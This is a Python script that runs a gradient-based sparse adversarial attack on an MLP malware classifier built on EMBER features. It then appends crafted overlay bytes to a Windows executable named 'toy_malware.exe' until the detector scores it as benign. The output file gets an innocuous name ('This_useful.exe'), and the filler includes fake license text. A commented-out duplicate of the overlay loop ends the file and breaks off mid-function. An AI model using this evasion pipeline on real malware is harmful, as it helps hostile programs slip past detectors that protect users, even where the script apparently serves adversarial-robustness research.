# sparse_l0_flip.py
import numpy as np
import joblib
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.serialization import add_safe_globals
from pathlib import Path

# ---------- Paths & device ----------
MODEL_FULL_PATH = "mlp_model_full.pth"     # optional (full pickled module)
MODEL_SD_PATH   = "mlp_model.pth"          # optional (state_dict)
SCALER_PATH     = "scaler.joblib"
X_SCALED_PATH   = "original_scaled_vector.npy"
DEVICE = "cuda" if torch.cuda.is_available() else "cpu"

# ---------- 0) Load scaler & sample FIRST (to infer input_features) ----------
scaler = joblib.load(SCALER_PATH)
x_scaled_np = np.load(X_SCALED_PATH)
if x_scaled_np.ndim == 2:
    x_scaled_np = x_scaled_np[0]
d = int(x_scaled_np.shape[0])
x_scaled = torch.tensor(x_scaled_np, dtype=torch.float32, device=DEVICE)

# === NEW: Allowed / Excluded feature indices ================================
# Keep L0 inside: [0..255] ∪ [256..511] ∪ [512..615]  => 0..615 inclusive
ALLOWED_IDX = np.r_[0:256]
# ALLOWED_IDX = np.r_[0:256, 256:512, 512:611]
# Optional hard excludes (e.g., 691), even if inside allowed (it isn't, but keep hook)
EXCLUDE_IDX = np.array([], dtype=int)      # e.g., np.array([691], dtype=int)

_allowed_mask_np = np.zeros(d, dtype=bool)
_allowed_mask_np[ALLOWED_IDX[ALLOWED_IDX < d]] = True
_allowed_mask_np[EXCLUDE_IDX[(EXCLUDE_IDX >= 0) & (EXCLUDE_IDX < d)]] = False
# If model input dim d is smaller than 616, this automatically trims to fit.

# Torch mask for fast ops
ALLOWED_MASK = torch.tensor(_allowed_mask_np, device=DEVICE, dtype=torch.bool)
# ===========================================================================

# ---------- 1) Define your model class (probability output) ----------
class MyMLP(nn.Module):
    def __init__(self, input_features=200):
        super(MyMLP, self).__init__()
        self.layer1 = nn.Linear(input_features, 512)
        self.relu1 = nn.ReLU()
        self.layer2 = nn.Linear(512, 256)
        self.relu2 = nn.ReLU()
        self.output_layer = nn.Linear(256, 1)
        self.sigmoid = nn.Sigmoid()
    def forward(self, x):
        # accept [d] or [1,d]
        if x.ndim == 1:
            x = x.unsqueeze(0)
        x = self.relu1(self.layer1(x))
        x = self.relu2(self.layer2(x))
        x = self.sigmoid(self.output_layer(x))   # returns probability
        # return scalar if batch=1
        return x.squeeze(-1) if x.shape[0] > 1 else x.squeeze()

# Some of your runs saved as __main__.MalwareMLP; alias it so pickle can resolve
class MalwareMLP(MyMLP):
    pass

# Allowlist the class in PyTorch 2.6 safe loading (only needed for full pickled model)
add_safe_globals([MalwareMLP, MyMLP])

# Wrapper to convert prob -> logit for stable gradients in the attack
class ProbToLogitWrapper(nn.Module):
    def __init__(self, prob_model, eps=1e-6):
        super().__init__()
        self.prob_model = prob_model
        self.eps = eps
    def forward(self, x):
        p = self.prob_model(x)       # probability scalar
        if p.ndim > 0:
            p = p.view(1)
        return torch.logit(p, eps=self.eps).view(())  # scalar logit

# ---------- 2) Load model (robust to full module or state_dict) ----------
def load_model_robust():
    model_prob = None

    # Try full model first (you must trust the file; weights_only=False)
    if Path(MODEL_FULL_PATH).exists():
        try:
            model_prob = torch.load(MODEL_FULL_PATH, map_location=DEVICE, weights_only=False)
            model_prob.eval().to(DEVICE)
            print(f"Loaded full model from {MODEL_FULL_PATH}")
        except Exception as e:
            print(f"Full model load failed ({MODEL_FULL_PATH}): {e}")

    # Fallback: load state_dict
    if model_prob is None and Path(MODEL_SD_PATH).exists():
        try:
            sd = torch.load(MODEL_SD_PATH, map_location=DEVICE, weights_only=True)
            # Build the architecture with inferred input size d
            model_prob = MyMLP(input_features=d).to(DEVICE)
            model_prob.load_state_dict(sd, strict=True)
            model_prob.eval()
            print(f"Loaded state_dict from {MODEL_SD_PATH} with input_features={d}")
        except Exception as e:
            print(f"state_dict load failed ({MODEL_SD_PATH}): {e}")

    if model_prob is None:
        raise RuntimeError("Could not load a model. Provide mlp_model_full.pth or mlp_model.pth.")

    # Wrap to expose logits
    model = ProbToLogitWrapper(model_prob).to(DEVICE).eval()
    return model, model_prob

model, model_prob = load_model_robust()

# ---------- 3) Helper: forward + prediction ----------
@torch.no_grad()
def predict_prob_from_scaled(x_scaled_vec: torch.Tensor) -> float:
    logit = model(x_scaled_vec).reshape(1)   # <— force shape [1]
    return torch.sigmoid(logit).item()

p0 = predict_prob_from_scaled(x_scaled)
y0 = int(p0 >= 0.5)
target = 1 - y0
print(f"Current prob={p0:.4f}, label={y0}, target={target}")

# ---------- 4) Sparse L0 attack utilities ----------
@torch.no_grad()
def rank_features_by_effect(grad, lower=None, upper=None, allowed_mask=None):
    """
    Returns indices sorted by descending |grad| * span, but only for allowed features.
    Disallowed features are suppressed to -inf so they can never be selected.
    """
    if lower is not None and upper is not None:
        span = (upper - lower).abs().clamp_min(1e-12)
        score = grad.abs() * span
    else:
        score = grad.abs()

    if allowed_mask is not None:
        # Set disallowed to -inf so they sort to the end (and we won't take them)
        minus_inf = torch.full_like(score, float("-inf"))
        score = torch.where(allowed_mask, score, minus_inf)

    return torch.argsort(score, descending=True)

def sparse_flip(
    model, x0_raw, target=0,
    k_min=1, k_max=None, max_outer_steps=20,
    inner_steps=200, inner_lr=0.05,
    lower=None, upper=None,
    normalize=None, denormalize=None,
    patience=3, random_restarts=3,
    allowed_mask: torch.Tensor = None,   # === NEW: plumb the mask
):
    device = x0_raw.device
    d_ = x0_raw.numel()
    if k_max is None: k_max = d_

    if allowed_mask is None:
        # Default to "all allowed" if not provided
        allowed_mask = torch.ones(d_, device=device, dtype=torch.bool)

    # Safety: if lengths mismatch (e.g., smaller input), trim the mask
    if allowed_mask.numel() != d_:
        if allowed_mask.numel() > d_:
            allowed_mask = allowed_mask[:d_]
        else:
            pad = torch.zeros(d_ - allowed_mask.numel(), device=device, dtype=torch.bool)
            allowed_mask = torch.cat([allowed_mask, pad], dim=0)

    def project(x_raw):
        if lower is not None and upper is not None:
            x_raw = x_raw.clamp(lower, upper)
        return x_raw

    def forward_logit(x_raw):
        x = normalize(x_raw) if normalize else x_raw
        out = model(x).reshape(1)  # [1]
        return out.squeeze(0)  # scalar

    def optimize_on_mask(x_start, mask):
        best_x = x_start.clone()
        best_val = float('inf')
        no_improve = 0

        for _ in range(random_restarts):
            x_raw = x_start.clone()
            if lower is not None and upper is not None:
                noise = (torch.rand_like(x_raw) - 0.5) * 0.02 * (upper - lower)
                x_raw = project(x_raw + noise * mask)

            for _ in range(inner_steps):
                x = normalize(x_raw) if normalize else x_raw
                x = x.detach().requires_grad_(True)  # make sure autograd tracks this tensor
                logit = model(x).reshape(1)
                y_t = torch.tensor([float(target)], device=device, dtype=logit.dtype)
                loss = F.binary_cross_entropy_with_logits(logit, y_t)

                # early exit if already flipped
                if (torch.sigmoid(logit) >= 0.5) == (target == 1):
                    return x_raw, True

                model.zero_grad(set_to_none=True)
                g = torch.autograd.grad(loss, x, retain_graph=False, create_graph=False)[0].detach()

                step = torch.zeros_like(x)
                step[mask.bool()] = -inner_lr * g[mask.bool()]
                x_new = x.detach() + step
                x_raw = denormalize(x_new) if denormalize else x_new
                x_raw = project(x_raw)

                val = loss.item()
                if val + 1e-6 < best_val:
                    best_val = val
                    best_x = x_raw.clone()
                    no_improve = 0
                else:
                    no_improve += 1
                    if no_improve >= patience:
                        no_improve = 0

            # check after inner loop
            logit = forward_logit(best_x)
            if (torch.sigmoid(logit) >= 0.5) == (target == 1):
                return best_x, True

        return best_x, False

    with torch.no_grad():
        cur_logit = forward_logit(x0_raw)
        cur_pred = (torch.sigmoid(cur_logit) >= 0.5).float().item()
        if int(cur_pred) == target:
            return x0_raw.clone(), 0, True

    def grad_at(x_raw):
        x = normalize(x_raw) if normalize else x_raw
        x = x.detach().requires_grad_(True)
        logit = model(x).reshape(1)
        y_t = torch.tensor([float(target)], device=device, dtype=logit.dtype)
        loss = F.binary_cross_entropy_with_logits(logit, y_t)
        model.zero_grad(set_to_none=True)
        g = torch.autograd.grad(loss, x, retain_graph=False, create_graph=False)[0].detach()
        return g

    # Exponential search for a successful k
    x_base = x0_raw.clone()
    k = k_min
    last_success = None
    for _ in range(max_outer_steps):
        g = grad_at(x_base)
        order = rank_features_by_effect(g, lower, upper, allowed_mask=allowed_mask)  # === NEW
        mask = torch.zeros(d_, device=device, dtype=torch.bool)
        # Fill mask ONLY with allowed top-k
        chosen = 0
        for idx in order.tolist():
            if idx < 0:   # guard if -inf sorted values spill (shouldn't happen)
                continue
            if not allowed_mask[idx]:
                continue
            mask[idx] = True
            chosen += 1
            if chosen >= k:
                break

        if chosen == 0:
            # No editable features available
            return x_base, None, False

        x_k, ok = optimize_on_mask(x_base, mask)
        if ok:
            last_success = (x_k.clone(), chosen)
            break
        k = min(k * 2, k_max)
        if k == (k // 2):
            break

    if last_success is None:
        return x_base, None, False

    # Binary search down to smallest k (respecting allowed mask)
    low, high = 1, last_success[1]
    x_best = last_success[0]
    while low < high:
        mid = (low + high) // 2
        g = grad_at(x_best)
        order = rank_features_by_effect(g, lower, upper, allowed_mask=allowed_mask)  # === NEW
        mask = torch.zeros(d_, device=device, dtype=torch.bool)
        chosen = 0
        for idx in order.tolist():
            if idx < 0:
                continue
            if not allowed_mask[idx]:
                continue
            mask[idx] = True
            chosen += 1
            if chosen >= mid:
                break

        if chosen == 0:
            break

        x_mid, ok = optimize_on_mask(x_best, mask)
        if ok:
            x_best, high = x_mid, chosen
        else:
            low = mid + 1

    return x_best, high, True

# ---------- 5A) Run in SCALED space (quick start) ----------
def id_fn(x): return x
x_best_scaled, k_found, flipped = sparse_flip(
    model=model,
    x0_raw=x_scaled,
    target=target,
    k_min=1,
    k_max=d,
    inner_steps=200,
    inner_lr=0.05,
    lower=None,
    upper=None,
    normalize=id_fn,
    denormalize=id_fn,
    random_restarts=3,
    allowed_mask=ALLOWED_MASK,     # === NEW: constrain to editable features
)

p1 = predict_prob_from_scaled(x_best_scaled)
print(f"[Scaled space] flipped={flipped}, k={k_found}, prob_after={p1:.4f}")

np.save("perturbed_scaled_vector.npy", x_best_scaled.detach().cpu().numpy())
delta = (x_best_scaled - x_scaled).detach().cpu().numpy()
changed_idx = np.where(np.abs(delta) > 1e-8)[0]
print(f"Changed features (scaled space): {changed_idx.tolist()}")
print(f"Deltas (scaled space): {delta[changed_idx]}")

# ---------- 5B) (Optional) Raw space with bounds ----------
USE_RAW_SPACE = False  # set True to try raw-space constrained run

if USE_RAW_SPACE:
    # Move the starting point to raw space
    x_raw0_np = scaler.inverse_transform(x_scaled.detach().cpu().numpy().reshape(1, -1))[0]
    x_raw0 = torch.tensor(x_raw0_np, dtype=torch.float32, device=DEVICE)

    # Define raw bounds; replace with domain-specific limits if you have them
    mu = torch.tensor(scaler.mean_, dtype=torch.float32, device=DEVICE)
    sig = torch.tensor(scaler.scale_, dtype=torch.float32, device=DEVICE).clamp_min(1e-12)
    lower_raw = (mu - 4*sig)
    upper_raw = (mu + 4*sig)

    def normalize_raw_to_scaled(x_raw: torch.Tensor) -> torch.Tensor:
        return (x_raw - mu) / sig
    def denormalize_scaled_to_raw(x_scaled_t: torch.Tensor) -> torch.Tensor:
        return x_scaled_t * sig + mu

    x_best_raw, k_found_raw, flipped_raw = sparse_flip(
        model=model,
        x0_raw=x_raw0,
        target=target,
        k_min=1,
        k_max=d,
        inner_steps=300,
        inner_lr=0.05,
        lower=lower_raw,
        upper=upper_raw,
        normalize=normalize_raw_to_scaled,
        denormalize=denormalize_scaled_to_raw,
        random_restarts=5,
        allowed_mask=ALLOWED_MASK,   # === NEW: still enforce the same constraint
    )

    x_best_scaled2 = normalize_raw_to_scaled(x_best_raw)
    p2 = predict_prob_from_scaled(x_best_scaled2)
    print(f"[Raw space] flipped={flipped_raw}, k={k_found_raw}, prob_after={p2:.4f}")

    np.save("perturbed_raw_vector.npy", x_best_raw.detach().cpu().numpy())
    delta_raw = (x_best_raw - x_raw0).detach().cpu().numpy()
    changed_idx2 = np.where(np.abs(delta_raw) > 1e-8)[0]
    print(f"Changed features (raw space): {changed_idx2.tolist()}")
    print(f"Deltas (raw space): {delta_raw[changed_idx2]}")



# ========================= OVERLAY CLOSED-LOOP (addition-only, top-K, seeded, early-stop) =========================
# Picks K features where "increase" helps (addition-only), appends small overlay chunks,
# re-extracts EMBER features, rescales with your scaler, and accepts only if probability
# moves toward `target`. Includes deterministic seeding, early stopping, patience, budget cap,
# and an optional shrink-to-fit step.

import os, random
from ember import PEFeatureExtractor
from typing import Optional, Tuple

# ---- Configure here ----
USE_OVERLAY_LOOP     = True                       # enable/disable overlay loop
EXE_IN_PATH          = r"toy_malware.exe"       # input PE to edit
EXE_OUT_PATH         = r"This_useful.exe"  # output path
FEATURE_VERSION      = 2                          # EMBER v2 => 2381-dim
K_TOP                = 5                          # pick top-K *positive* (addition-only) features

# Step strategy
CHUNK_SIZE_BYTES     = 1024                        # small iterative step
MAX_TOTAL_APPEND     = 32_768                     # total overlay budget cap (e.g., 32 KB)
TARGET_THRESHOLD     = 0.45                       # stop once prob <= this (for target=0); add margin off 0.50
PATIENCE_STEPS       = 4                          # stop after N non-improving attempts
MIN_IMPROVE          = 1e-3                       # require at least this much improvement to reset patience

# Shrink-to-fit (optional): after flip, try to reduce the last chunk size by binary halving
SHRINK_TO_FIT        = True

# Deterministic seeding
SEED                 = 1337                       # set None to skip seeding

# ------------- Determinism / RNG -------------
if SEED is not None:
    random.seed(SEED)
    np.random.seed(SEED)
    try:
        torch.manual_seed(SEED)
        if torch.cuda.is_available():
            torch.cuda.manual_seed_all(SEED)
            # Optional CUDA determinism (may slow a bit)
            torch.backends.cudnn.deterministic = True
            torch.backends.cudnn.benchmark = False
    except Exception:
        pass
# A single NumPy Generator for overlays
_RNG = np.random.default_rng(SEED if SEED is not None else None)

# ----------------------------------------------------------------------------- helpers

def extract_scaled_from_exe(exe_path: str, scaler) -> torch.Tensor:
    """Extract EMBER v2 features from a PE, then scale with the same StandardScaler the model uses."""
    fe = PEFeatureExtractor(feature_version=FEATURE_VERSION, print_feature_warning=False)
    with open(exe_path, "rb") as f:
        bytez = f.read()
    raw = fe.raw_features(bytez)
    vec = fe.process_raw_features(raw).astype(np.float32)  # (2381,)
    x_scaled_np = scaler.transform(vec.reshape(1, -1))[0]
    return torch.tensor(x_scaled_np, dtype=torch.float32, device=DEVICE)

def decode_byte_entropy_index(i: int):
    """Map 256..511 -> (entropy_bin 0..15, nibble_bin 0..15)."""
    pos = i - 256
    return pos // 16, pos % 16

def append_overlay(in_path: str, overlay: bytes, out_path: str):
    with open(in_path, "rb") as f:
        orig = f.read()
    with open(out_path, "wb") as f:
        f.write(orig + overlay)

# ----------------- overlay crafters (addition-only policy)

def craft_overlay_for_feature(idx: int,
                              desired_sign: int,
                              total_len: int,
                              grad_vec=None) -> Optional[bytes]:
    """
    Synthesize overlay bytes to (roughly) push feature idx upward (addition-only).
    desired_sign is kept for API compatibility but only +1 is used by the chooser.
    Returns bytes or None if not supported.
    """
    # Use the seeded module-level RNG for reproducibility
    rng = _RNG

    def uniform_bytes(choices, length):
        choices = np.fromiter(choices, dtype=np.uint8)
        probs = np.full(choices.size, 1.0 / choices.size)
        return bytes(rng.choice(choices, size=length, p=probs))

    def nonprint_pool(exclude=set()):
        # Avoid printable ASCII to keep string features stable
        return [x for x in range(0x00, 0x100) if x not in exclude and not (0x20 <= x <= 0x7E)]

    def random_printable(length):
        return uniform_bytes(range(0x20, 0x7F), length)

    # 0) BYTE HISTOGRAM (0..255): addition-only => add mostly that byte
    if 0 <= idx <= 255:
        b = idx
        core = bytes([b]) * int(total_len * 0.9)
        pool = nonprint_pool(exclude={b})
        if not pool:  # safety fallback
            pool = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0]
        rest = bytes(rng.choice(np.array(pool, dtype=np.uint8), size=total_len - len(core)))
        return core + rest

    # 1) BYTE-ENTROPY HISTOGRAM (256..511): addition-only => push mass into the (ebin, nibble) cell
    if 256 <= idx <= 511:
        ebin, nb = decode_byte_entropy_index(idx)
        lo = nb << 4
        hi = (nb << 4) | 0x0F
        nibble_pool = list(range(lo, hi + 1))
        if ebin <= 3:
            # For low-entropy bins, use long runs of a single non-printable byte in the nibble
            b = lo
            if 0x20 <= b <= 0x7E:
                b = lo | 0x08
            return bytes([b]) * total_len
        else:
            # For higher-entropy bins, random draw within the nibble
            return uniform_bytes(nibble_pool, total_len)

    # 2) STRINGS BLOCK (512..611 only; 612..615 are excluded upstream by ALLOWED_MASK)
    if 512 <= idx <= 611:
        # 512=numstrings; 513=avlength; 514=printables; 515..610 ASCII bins; 611=printable entropy
        if idx == 512:
            s = (" ref guide doc " * (max(1, total_len // 14)))[:total_len]
            return s.encode("ascii", errors="ignore")
        if idx == 513:
            para = ("This application includes components licensed under the MIT License. " * 50)
            blob = (para * (total_len // len(para) + 1))[:total_len]
            return blob.encode("ascii", errors="ignore")
        if idx == 514:
            return random_printable(total_len)
        if 515 <= idx <= 610:
            ch = 0x20 + (idx - 515)
            core = bytes([ch]) * int(total_len * 0.9)
            rest = random_printable(total_len - len(core))
            return core + rest
        if idx == 611:
            return random_printable(total_len)

    return None  # unsupported index for overlay crafting

# ----------------- chooser: top-K *positive* (addition-only)

def choose_topK_allowed_addition_only(x_scaled_vec: torch.Tensor, target: int, K: int):
    """
    Return (idxs, signs, grad) where signs are all +1 (addition-only policy).
    We select indices where increasing the feature reduces loss (gradient negative).
    """
    x = x_scaled_vec.detach().clone().requires_grad_(True)
    logit = model(x).reshape(1)
    y_t = torch.tensor([float(target)], device=DEVICE, dtype=logit.dtype)
    loss = F.binary_cross_entropy_with_logits(logit, y_t)
    model.zero_grad(set_to_none=True)
    g = torch.autograd.grad(loss, x, retain_graph=False, create_graph=False)[0].detach().cpu().numpy()

    # Rank by effect but prefer negative-gradient coords (increase helps)
    order = rank_features_by_effect(torch.tensor(g, device=DEVICE),
                                    allowed_mask=ALLOWED_MASK).cpu().numpy().tolist()

    pos_idxs = []
    for i in order:
        if i < 0 or not ALLOWED_MASK[i]:
            continue
        # Increase feature reduces loss iff grad[i] < 0
        if g[i] < 0:
            pos_idxs.append(i)
            if len(pos_idxs) >= K:
                break

    # If fewer than K positives exist, fill with next-best allowed (still +1 sign).
    if len(pos_idxs) < K:
        for i in order:
            if i in pos_idxs or i < 0 or not ALLOWED_MASK[i]:
                continue
            pos_idxs.append(i)
            if len(pos_idxs) >= K:
                break

    signs = np.ones(len(pos_idxs), dtype=int)  # +1 (addition-only)
    return np.array(pos_idxs, dtype=int), signs, g

# ----------------- composite overlay (concatenate per-feature sub-blobs)

def craft_composite_overlay(idxs, signs, total_len, grad_vec):
    """
    Build one overlay from per-feature sub-blobs.
    Allocate bytes per feature proportional to |grad| (more sensitive features get more budget).
    Addition-only: signs are +1; we still accept signs to keep API uniform.
    """
    if len(idxs) == 0 or total_len <= 0:
        return b""

    weights = np.abs(grad_vec[idxs])
    if not np.isfinite(weights).all() or weights.sum() == 0:
        weights = np.ones_like(weights, float)
    weights = weights / weights.sum()

    lengths = (weights * total_len).astype(int)
    # ensure exact total_len
    gap = total_len - int(lengths.sum())
    if gap > 0:
        lengths[0] += gap

    parts = []
    for i, s, L in zip(idxs, signs, lengths):
        if L <= 0:
            continue
        blob = craft_overlay_for_feature(i, int(s), total_len=int(L), grad_vec=grad_vec)
        if blob:
            parts.append(blob)
    return b"".join(parts)

# ----------------- main overlay loop (early stop, patience, budget, shrink-to-fit)

def overlay_closed_loop():
    if not USE_OVERLAY_LOOP:
        return

    src = EXE_IN_PATH
    dst = EXE_OUT_PATH

    # Baseline on-disk features
    x_scaled_exe = extract_scaled_from_exe(src, scaler)
    p_before = predict_prob_from_scaled(x_scaled_exe)
    print(f"[Overlay] prob_before={p_before:.4f} (target={target})")

    best_prob = p_before
    best_path = src
    appended_total = 0
    patience = 0

    # Track last accepted chunk to enable shrink-to-fit
    last_accept_info = None  # (base_before_chunk_path, idxs, signs, grad_vec, chunk_size)

    # Helper: did we reach target with margin?
    def flipped_safely(prob: float) -> bool:
        if target == 0:
            return prob <= TARGET_THRESHOLD
        else:
            return prob >= (1.0 - TARGET_THRESHOLD)

    # Greedy small-step loop with early stopping / patience / budget
    while appended_total < MAX_TOTAL_APPEND and not flipped_safely(best_prob):
        x_scaled_cur = extract_scaled_from_exe(best_path, scaler)
        idxs, signs, g = choose_topK_allowed_addition_only(x_scaled_cur, target, K=K_TOP)
        print(f"[Overlay] step chunk={CHUNK_SIZE_BYTES}, idxs={idxs.tolist()}, signs={signs.tolist()}")

        ov = craft_composite_overlay(idxs, signs, total_len=CHUNK_SIZE_BYTES, grad_vec=g)
        if not ov:
            print("[Overlay] composite crafter returned empty; stopping.")
            break

        append_overlay(best_path, ov, dst)
        x_scaled_new = extract_scaled_from_exe(dst, scaler)
        p_after = predict_prob_from_scaled(x_scaled_new)
        print(f"[Overlay] → prob={p_after:.4f}")

        improved = (target == 0 and p_after < best_prob - MIN_IMPROVE) or (target == 1 and p_after > best_prob + MIN_IMPROVE)
        if improved:
            print(f"[Overlay] accepted chunk={CHUNK_SIZE_BYTES}")
            appended_total += CHUNK_SIZE_BYTES
            best_prob = p_after
            # Save the base path before this chunk for shrink-to-fit
            last_accept_info = (best_path, idxs, signs, g, CHUNK_SIZE_BYTES)
            best_path = dst
            src = best_path
            patience = 0
        else:
            # Discard this attempt
            try:
                os.remove(dst)
            except OSError:
                pass
            patience += 1
            if patience >= PATIENCE_STEPS:
                print("[Overlay] patience exceeded; stopping.")
                break

    # Optional shrink-to-fit: after flipping, try to halve the last chunk to trim bytes
    if SHRINK_TO_FIT and last_accept_info is not None and flipped_safely(best_prob):
        base_path, idxs, signs, g, last_len = last_accept_info
        low, high = 1, last_len
        best_keep_prob = best_prob
        best_keep_path = best_path
        # Binary search smallest chunk that keeps us flipped
        while low < high:
            mid = (low + high) // 2
            # Rebuild from base_path with a smaller chunk (mid)
            tmp_path = EXE_OUT_PATH + ".shrink_tmp"
            ov_small = craft_composite_overlay(idxs, signs, total_len=mid, grad_vec=g)
            append_overlay(base_path, ov_small, tmp_path)
            p_mid = predict_prob_from_scaled(extract_scaled_from_exe(tmp_path, scaler))
            if flipped_safely(p_mid):
                # accept smaller
                best_keep_prob = p_mid
                best_keep_path = tmp_path
                high = mid
            else:
                # need bigger
                try: os.remove(tmp_path)
                except OSError: pass
                low = mid + 1

        # If we found a smaller variant that still flips, keep it
        if best_keep_path != best_path:
            try:
                # Replace final artifact with the trimmed one
                if os.path.exists(best_path):
                    os.remove(best_path)
                os.replace(best_keep_path, EXE_OUT_PATH)
            except Exception:
                pass
            best_path = EXE_OUT_PATH
            # Adjust appended_total estimate
            appended_total = appended_total - last_len + high
            best_prob = best_keep_prob
            print(f"[Overlay] shrink-to-fit accepted, final_chunk={high}, prob={best_prob:.4f}")

    if best_path != EXE_IN_PATH:
        print(f"[Overlay] Success. Wrote improved sample: {best_path}, prob={best_prob:.4f}, total_appended={appended_total} bytes")
    else:
        print("[Overlay] No improving overlay found.")

# Run the overlay loop if enabled
overlay_closed_loop()
# =================================================================================================



# # ========================= OVERLAY CLOSED-LOOP (addition-only, top-K) =========================
# # This section takes a PE file, chooses K features where "increase" helps,
# # synthesizes an overlay that *adds* bytes to raise those features, writes it,
# # re-extracts EMBER features, rescales with your scaler, and keeps the edit
# # only if the probability moves toward `target`.
#
# import os
# from ember import PEFeatureExtractor
# from typing import Optional, Tuple
#
# # ---- Configure here ----
# USE_OVERLAY_LOOP = True                      # enable/disable overlay loop
# EXE_IN_PATH = r"toy_malware.exe"           # input PE to edit
# EXE_OUT_PATH = r"toy_malware_patched.exe"  # output path
# FEATURE_VERSION = 2                          # EMBER v2 => 2381-dim
#
# K_TOP = 5                                    # pick top-K *positive* (addition-only) features
# OVERLAY_TRIES = [1024, 2048, 4096, 8192]     # bytes appended on successive attempts (modest sizes)
#
# # ----------------------------------------------------------------------------- helpers
#
# def extract_scaled_from_exe(exe_path: str, scaler) -> torch.Tensor:
#     """Extract EMBER v2 features from a PE, then scale with the same StandardScaler the model uses."""
#     fe = PEFeatureExtractor(feature_version=FEATURE_VERSION, print_feature_warning=False)
#     with open(exe_path, "rb") as f:
#         bytez = f.read()
#     raw = fe.raw_features(bytez)
#     vec = fe.process_raw_features(raw).astype(np.float32)  # (2381,)
#     x_scaled_np = scaler.transform(vec.reshape(1, -1))[0]
#     return torch.tensor(x_scaled_np, dtype=torch.float32, device=DEVICE)
#
# def decode_byte_entropy_index(i: int):
#     """Map 256..511 -> (entropy_bin 0..15, nibble_bin 0..15)."""
#     pos = i - 256
#     return pos // 16, pos % 16
#
# def append_overlay(in_path: str, overlay: bytes, out_path: str):
#     with open(in_path, "rb") as f:
#         orig = f.read()
#     with open(out_path, "wb") as f:
#         f.write(orig + overlay)
#
# # ----------------- overlay crafters (addition-only policy)
#
# def craft_overlay_for_feature(idx: int,
#                               desired_sign: int,
#                               total_len: int,
#                               grad_vec=None) -> Optional[bytes]:
#     """
#     Synthesize overlay bytes to (roughly) push feature idx upward (addition-only).
#     desired_sign is kept for API compatibility but only +1 is used by the chooser.
#     Returns bytes or None if not supported.
#     """
#     rng = np.random.default_rng()
#
#     def uniform_bytes(choices, length):
#         choices = np.fromiter(choices, dtype=np.uint8)
#         probs = np.full(choices.size, 1.0 / choices.size)
#         return bytes(rng.choice(choices, size=length, p=probs))
#
#     def nonprint_pool(exclude=set()):
#         # Avoid printable ASCII to keep string features stable
#         return [x for x in range(0x00, 0x100) if x not in exclude and not (0x20 <= x <= 0x7E)]
#
#     def random_printable(length):
#         return uniform_bytes(range(0x20, 0x7F), length)
#
#     # 0) BYTE HISTOGRAM (0..255): addition-only => add mostly that byte
#     if 0 <= idx <= 255:
#         b = idx
#         core = bytes([b]) * int(total_len * 0.9)
#         pool = nonprint_pool(exclude={b})
#         if not pool:  # safety fallback
#             pool = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0]
#         rest = bytes(rng.choice(pool, size=total_len - len(core)))
#         return core + rest
#
#     # 1) BYTE-ENTROPY HISTOGRAM (256..511): addition-only => push mass into the (ebin, nibble) cell
#     if 256 <= idx <= 511:
#         ebin, nb = decode_byte_entropy_index(idx)
#         lo = nb << 4
#         hi = (nb << 4) | 0x0F
#         nibble_pool = list(range(lo, hi + 1))
#         if ebin <= 3:
#             # For low-entropy bins, use long runs of a single non-printable byte in the nibble
#             b = lo
#             if 0x20 <= b <= 0x7E:
#                 b = lo | 0x08
#             return bytes([b]) * total_len
#         else:
#             # For higher-entropy bins, random draw within the nibble
#             return uniform_bytes(nibble_pool, total_len)
#
#     # 2) STRINGS BLOCK (512..611 only; 612..615 are excluded upstream by ALLOWED_MASK)
#     if 512 <= idx <= 611:
#         # 512=numstrings; 513=avlength; 514=printables; 515..610 ASCII bins; 611=printable entropy
#         if idx == 512:
#             s = (" ref guide doc " * (max(1, total_len // 14)))[:total_len]
#             return s.encode("ascii", errors="ignore")
#         if idx == 513:
#             para = ("This application includes components licensed under the MIT License. " * 50)
#             blob = (para * (total_len // len(para) + 1))[:total_len]
#             return blob.encode("ascii", errors="ignore")
#         if idx == 514:
#             return random_printable(total_len)
#         if 515 <= idx <= 610:
#             ch = 0x20 + (idx - 515)
#             core = bytes([ch]) * int(total_len * 0.9)
#             rest = random_printable(total_len - len(core))
#             return core + rest
#         if idx == 611:
#             return random_printable(total_len)
#
#     return None  # unsupported index for overlay crafting
#
# # ----------------- chooser: top-K *positive* (addition-only)
#
# def choose_topK_allowed_addition_only(x_scaled_vec: torch.Tensor, target: int, K: int):
#     """
#     Return (idxs, signs, grad) where signs are all +1 (addition-only policy).
#     We select indices where increasing the feature reduces loss (gradient negative).
#     """
#     x = x_scaled_vec.detach().clone().requires_grad_(True)
#     logit = model(x).reshape(1)
#     y_t = torch.tensor([float(target)], device=DEVICE, dtype=logit.dtype)
#     loss = F.binary_cross_entropy_with_logits(logit, y_t)
#     model.zero_grad(set_to_none=True)
#     g = torch.autograd.grad(loss, x, retain_graph=False, create_graph=False)[0].detach().cpu().numpy()
#
#     # Rank by effect but we will *prefer* negative-gradient coords (increase helps)
#     order = rank_features_by_effect(torch.tensor(g, device=DEVICE),
#                                     allowed_mask=ALLOWED_MASK).cpu().numpy().tolist()
#
#     pos_idxs = []
#     for i in order:
#         if i < 0 or not ALLOWED_MASK[i]:
#             continue
#         # sign convention: increasing feature reduces loss iff grad[i] < 0
#         if g[i] < 0:
#             pos_idxs.append(i)
#             if len(pos_idxs) >= K:
#                 break
#
#     # If fewer than K positives exist, fill with next-best allowed (still +1 sign).
#     if len(pos_idxs) < K:
#         for i in order:
#             if i in pos_idxs or i < 0 or not ALLOWED_MASK[i]:
#                 continue
#             pos_idxs.append(i)
#             if len(pos_idxs) >= K:
#                 break
#
#     signs = np.ones(len(pos_idxs), dtype=int)  # +1 (addition-only)
#     return np.array(pos_idxs, dtype=int), signs, g
#
# # ----------------- composite overlay (concatenate per-feature sub-blobs)
#
# def craft_composite_overlay(idxs, signs, total_len, grad_vec):
#     """
#     Build one overlay from per-feature sub-blobs.
#     Allocate bytes per feature proportional to |grad| (more sensitive features get more budget).
#     Addition-only: signs are +1; we still accept signs to keep API uniform.
#     """
#     if len(idxs) == 0 or total_len <= 0:
#         return b""
#
#     weights = np.abs(grad_vec[idxs])
#     if not np.isfinite(weights).all() or weights.sum() == 0:
#         weights = np.ones_like(weights, float)
#     weights = weights / weights.sum()
#
#     lengths = (weights * total_len).astype(int)
#     # ensure exact total_len
#     gap = total_len - int(lengths.sum())
#     if gap > 0:
#         lengths[0] += gap
#
#     parts = []
#     for i, s, L in zip(idxs, signs, lengths):
#         if L <= 0:
#             continue
#         blob = craft_overlay_for_feature(i, int(s), total_len=int(L), grad_vec=grad_vec)
